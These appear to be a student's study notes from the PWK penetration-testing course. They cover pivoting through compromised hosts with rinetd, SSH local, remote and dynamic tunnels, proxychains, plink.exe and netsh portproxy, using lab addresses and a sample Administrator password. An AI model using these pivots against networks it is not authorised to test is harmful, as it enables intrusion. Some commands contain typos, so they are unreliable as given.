# PWK PDF Highlights

## Port Forwarding

Redirect traffic destined for one IP address and port to another IP address and port.

### RINETD

During an assessment, we gained root access to an Internet-connected Linux web server. From there, we found and compromised a Linux client on an internal network, gaining access to SSH credentials.

```bash
# From Kali
# Test network connectivity
kali@kali:~$ ping google.com -c 1
PING google.com (216.58.207.142) 56(84) bytes of data.

# Test connection to found IP
kali@kali:~$ root@kali:~# nc -nvv 216.58.207.142 80
(UNKNOWN) [216.58.207.142] 80 (http) open
GET / HTTP/1.0
```

```bash
# Access compromised target via SSH
kali@kali:~# ssh student@10.11.0.128

# Test network connectivity -- no internet access
kali@kali:~$ ping google.com -c 1
(UNKNOWN) [216.58.207.142] 80 (http) : No route to host
```

```bash
# Redirect traffic to our Kali linux server using RINETD

ss -antp | grep "80"

# From Compromised target to Kali linux
student@debian:~$ nc -nvv 10.11.0.4 80
(UNKNOWN) [10.11.0.4] 80 (http) open
GET / HTTP/1.0

```

## SSH Tunneling

### SSH Local Port Forwarding

Tunnel a local port to a remote server using SSH. Similar to RINETD.

```bash
# Kali --> 22 Linux compromised client --> Windows Server target
# From Kali
ssh -N -L <bind/kali-address:port>:<Windows Server target:port> <username@compomised client ddress>
ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128
# Any incoming connections on port 445 of Kali will be forwarded to Windows Server through compromised linux client
# Update smb.conf with 'min protocol = SMB2' and restart the daemon

# Access Windows Server (target) SMB shares from Kali
kali@kali:~$ smbclient -L 127.0.0.1 -U Administrator

```

### SSH Remote Port Forwarding

Connections specified port on remote host will be forwarded to the specified port on the local machine.

Scenario: Access to a non-root shell on a Linux client in the internal network. We discovered a mysql server running on TCP port 3306. Firewall blocking inbound connections on port 22. Can't SSH into server from Kali. BUT we can SSH out TO our Kali machine.

```bash
# From Linux compromised client
student@debian:~$ ssh -N -R <bind-address:port>:<host:hostport> username@kali-address
student@debian:~$ ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4
```

This will forward all incoming traffic on our Kali systems local port 2221 to port 3306 on the compromised box through an SSH tunnel, allowing us to reach the mysql port even though it is blocked at the firewall.

```bash
# From Kali
ss -antp | grep "2221"
# Scan forwarded mysql service - enumerate output
sudo nmap -sV 127.0.0.1 -p 2221
# mysql access
mysql -h 
```

### SSH Dynamic Port Forwarding

Set a local listening port, having it tunnel incoming traffic to any remote destinatino through the use of a proxy.

```bash
# From Linux compromised client
# We find another network interface connected to another network
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
ssh -N -D <sock4 proxy on Kali:8080> <student@compromised linux machine>
ssh -N -D 127.0.0.1:8080 student@10.11.0.128
```

#### Proxychains

```bash
# Edit peoxychains.conf adding...
socks4 127.0.0.1 8080
# Run tools through proxy
proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
```

## Plink.exe

Pivoting through Windows based operating systems.

Scenario: From compromising a Windows server, we discover a mysqld.exe running on port 3306.

```powershell
# From a Windows System shell
# Transfer Plink.exe to this Windows system
plink.exe -ssh -l kali -pw kali -R <kali-machine:port>:<Windoww-system:port> <kali-machine>
plink.exe -ssh -l kali -pw kali -R 100.11.0.4:1234:127.0.0.1:3306 10.11.0.4
# From Kali
sudo nmap -sV 127.0.0.1 -p 1234
```

## NETSH

Scenario: Compromised a Windows target through remote vuln and obtain System privileges. We find an additional network interface. We identify a Windows Server that has port 445 open.

```powershell
# From Windows compromised target
netsh interface portproxy add v4tov4 listenport=<kali port> listenaddress=<kali IP> connectport=<Windows server port> <connectaddress=<Windows server address>
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
# Check for listening
netstat -anp TCP | find "4455"
# With admin permissions we can allo forwarding rule
netsh advfirewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action allow

# From Kali
smbclient -L 10.11.0.22 --port=4455 --user=Administrator
Data
# If an error occurs, we can test interaction
sudo mkdir /mnt/win10_share
sudo mount -t cifs -o port=4455 //10.11.0.22/Data -o username=Administrator,password=Qwerty /mnt/win10_share
ls -l /mnt/win10_share
```

## HTTPTunnel-ing Through Deep Packet Inspection

```
```
